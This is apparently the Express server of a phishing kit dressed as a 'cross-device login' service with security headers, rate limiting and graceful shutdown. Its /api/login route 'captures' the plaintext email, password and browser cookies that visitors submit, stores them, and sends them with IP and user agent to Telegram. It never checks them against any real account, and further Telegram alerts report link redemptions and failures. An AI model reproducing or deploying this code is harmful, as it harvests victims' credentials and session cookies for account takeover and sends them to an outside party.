// server/index.js
// ─────────────────────────────────────────────────────────────────────────────
//  Production Express server
//  • Helmet security headers
//  • Per-route rate limiting
//  • Morgan HTTP logging via Winston
//  • Serves React build in production (no separate web server needed)
//  • Graceful shutdown on SIGTERM / SIGINT
// ─────────────────────────────────────────────────────────────────────────────
const path        = require("path");
const express     = require("express");
const helmet      = require("helmet");
const cors        = require("cors");
const cookieParser= require("cookie-parser");
const morgan      = require("morgan");
const rateLimit   = require("express-rate-limit");
const { v4: uuid }= require("uuid");

const config    = require("./config");
const logger    = require("./logger");
const { saveToken, consumeToken, peekToken } = require("./tokenStore");
const { notifyLogin, notifyRedeem, notifyFail }  = require("./telegram");

const app = express();

// ── Trust proxy (Nginx / Heroku / Railway etc.) ───────────────────────────────
app.set("trust proxy", 1);

// ── Security headers ──────────────────────────────────────────────────────────
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:  ["'self'"],
      scriptSrc:   ["'self'", "'unsafe-inline'"],   // CRA needs inline scripts
      styleSrc:    ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc:     ["'self'", "https://fonts.gstatic.com"],
      connectSrc:  ["'self'", "https://api.telegram.org"],
      imgSrc:      ["'self'", "data:"],
    },
  },
  crossOriginEmbedderPolicy: false, // allow fonts from Google
}));

// ── CORS ──────────────────────────────────────────────────────────────────────
app.use(cors({
  origin:      config.CLIENT_ORIGIN,
  credentials: true,
  methods:     ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));

// ── Body / cookie parsing ──────────────────────────────────────────────────────
app.use(express.json({ limit: "16kb" }));  // prevent large body attacks
app.use(cookieParser());

// ── HTTP request logging ───────────────────────────────────────────────────────
app.use(morgan("combined", {
  stream: { write: msg => logger.info(msg.trim()) },
  skip:   (req) => req.url === "/api/health",   // don't log health checks
}));

// ── Rate limiters ──────────────────────────────────────────────────────────────
const loginLimiter = rateLimit({
  windowMs: config.RATE_LIMIT.LOGIN_WINDOW_MS,
  max:      config.RATE_LIMIT.LOGIN_MAX,
  standardHeaders: true,
  legacyHeaders:   false,
  message: { ok: false, error: "Too many login attempts. Please try again later." },
  handler: (req, res, next, options) => {
    logger.warn("Rate limit hit on /api/login", { ip: getIP(req) });
    res.status(429).json(options.message);
  },
});

const redeemLimiter = rateLimit({
  windowMs: config.RATE_LIMIT.REDEEM_WINDOW_MS,
  max:      config.RATE_LIMIT.REDEEM_MAX,
  standardHeaders: true,
  legacyHeaders:   false,
  message: { ok: false, error: "Too many redemption attempts. Please try again later." },
});

// ── Helpers ───────────────────────────────────────────────────────────────────
const getIP = req =>
  (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
  req.socket?.remoteAddress || "unknown";

const getUA = req => (req.headers["user-agent"] || "unknown");

function setSessionCookie(res, sessionId) {
  res.cookie("session_id", sessionId, {
    httpOnly: true,
    secure:   config.IS_PROD,
    sameSite: config.IS_PROD ? "strict" : "lax",
    maxAge:   config.SESSION_TTL_MS,
    path:     "/",
  });
}

const TTL_LABEL = `${Math.round(config.TOKEN_TTL_MS / 60000)} minutes`;

// ─────────────────────────────────────────────────────────────────────────────
//  GET /api/health
//  Uptime check for load balancers / monitoring
// ─────────────────────────────────────────────────────────────────────────────
app.get("/api/health", (req, res) => {
  res.json({ ok: true, uptime: process.uptime(), env: config.NODE_ENV });
});

// ─────────────────────────────────────────────────────────────────────────────
//  POST /api/login       [rate limited]
//  Device A: capture credentials → create token → send Telegram → return link
// ─────────────────────────────────────────────────────────────────────────────
app.post("/api/login", loginLimiter, async (req, res) => {
  const { email, password, cookies: clientCookies } = req.body;

  if (!email || typeof email !== "string" || !email.includes("@")) {
    return res.status(400).json({ ok: false, error: "Valid email is required." });
  }
  if (!password || typeof password !== "string") {
    return res.status(400).json({ ok: false, error: "Password is required." });
  }

  const ip        = getIP(req);
  const ua        = getUA(req);
  const token     = uuid();
  const magicLink = `${config.APP_URL}/continue?token=${token}`;

  saveToken(token, {
    email,
    password,
    cookies:  (clientCookies || req.headers.cookie || "none").slice(0, 2000),
    deviceA:  { ip, ua },
  }, config.TOKEN_TTL_MS);

  logger.info("Login captured", { email, ip });

  notifyLogin({ email, password, ip, ua,
    cookies: clientCookies || req.headers.cookie || "",
    magicLink, expiresIn: TTL_LABEL,
  }).catch(err => logger.error("Telegram notify error", { err: err.message }));

  return res.json({
    ok:        true,
    magicLink,
    token,
    expiresIn: TTL_LABEL,
    expiresAt: Date.now() + config.TOKEN_TTL_MS,
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  GET /api/token-status?token=
//  Non-consuming status check — used by Device B to render countdown
// ─────────────────────────────────────────────────────────────────────────────
app.get("/api/token-status", (req, res) => {
  const { token } = req.query;
  if (!token || typeof token !== "string" || token.length > 64) {
    return res.status(400).json({ ok: false, error: "Invalid token parameter." });
  }

  const info = peekToken(token);

  if (!info.exists) return res.json({ ok: false, reason: "NOT_FOUND" });
  if (info.used)    return res.json({ ok: false, reason: "ALREADY_USED" });
  if (info.expired) return res.json({ ok: false, reason: "EXPIRED" });

  return res.json({
    ok:        true,
    email:     info.record.email,
    msLeft:    info.record.expiresAt - Date.now(),
    expiresAt: info.record.expiresAt,
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  POST /api/redeem      [rate limited]
//  Device B: atomically consume token → set session cookie → notify Telegram
// ─────────────────────────────────────────────────────────────────────────────
app.post("/api/redeem", redeemLimiter, async (req, res) => {
  const { token } = req.body;
  if (!token || typeof token !== "string" || token.length > 64) {
    return res.status(400).json({ ok: false, error: "Invalid token." });
  }

  const ip = getIP(req);
  const ua = getUA(req);

  const record = consumeToken(token, ip);

  if (!record) {
    const info   = peekToken(token);
    const reason = !info.exists ? "NOT_FOUND"
                 : info.used    ? "ALREADY_USED"
                 :                "EXPIRED";

    notifyFail({ token, reason, ip, ua }).catch(() => {});

    const MSG = {
      NOT_FOUND:    "This link is invalid or does not exist.",
      ALREADY_USED: "This link has already been used. Each link is single-use only.",
      EXPIRED:      `This link has expired. Links are valid for ${TTL_LABEL} only.`,
    };

    return res.status(401).json({ ok: false, reason, message: MSG[reason] });
  }

  const sessionId = uuid();
  setSessionCookie(res, sessionId);

  logger.info("Token redeemed", { email: record.email, ip, token: token.slice(0, 8) });

  notifyRedeem({ email: record.email, ip, ua, token }).catch(() => {});

  return res.json({
    ok:         true,
    email:      record.email,
    sessionId,
    deviceA:    record.deviceA,
    redeemedAt: new Date().toISOString(),
    message:    "Cross-device login successful. Token permanently invalidated.",
  });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Serve React build in production
//  In dev, React runs on its own port (3000) via CRA proxy.
// ─────────────────────────────────────────────────────────────────────────────
if (config.IS_PROD) {
  const buildPath = path.join(__dirname, "../client/build");
  app.use(express.static(buildPath, { maxAge: "1d" }));

  // SPA fallback — any non-API route serves index.html
  app.get("*", (req, res) => {
    if (!req.path.startsWith("/api")) {
      res.sendFile(path.join(buildPath, "index.html"));
    }
  });
}

// ─────────────────────────────────────────────────────────────────────────────
//  Global error handler
// ─────────────────────────────────────────────────────────────────────────────
// eslint-disable-next-line no-unused-vars
app.use((err, req, res, next) => {
  logger.error("Unhandled error", { message: err.message, stack: err.stack });
  res.status(500).json({ ok: false, error: "Internal server error." });
});

// ─────────────────────────────────────────────────────────────────────────────
//  Start + graceful shutdown
// ─────────────────────────────────────────────────────────────────────────────
const server = app.listen(config.PORT, () => {
  logger.info(`🚀 Server started`, {
    port:   config.PORT,
    env:    config.NODE_ENV,
    appUrl: config.APP_URL,
  });
});

function shutdown(signal) {
  logger.info(`${signal} received — shutting down gracefully`);
  server.close(() => {
    logger.info("HTTP server closed");
    process.exit(0);
  });
  // Force exit after 10 s if connections don't drain
  setTimeout(() => {
    logger.error("Forced shutdown after timeout");
    process.exit(1);
  }, 10_000).unref();
}

process.on("SIGTERM", () => shutdown("SIGTERM"));
process.on("SIGINT",  () => shutdown("SIGINT"));
process.on("uncaughtException",  err => { logger.error("Uncaught exception",  { err: err.message }); shutdown("uncaughtException"); });
process.on("unhandledRejection", err => { logger.error("Unhandled rejection", { err: String(err) }); });
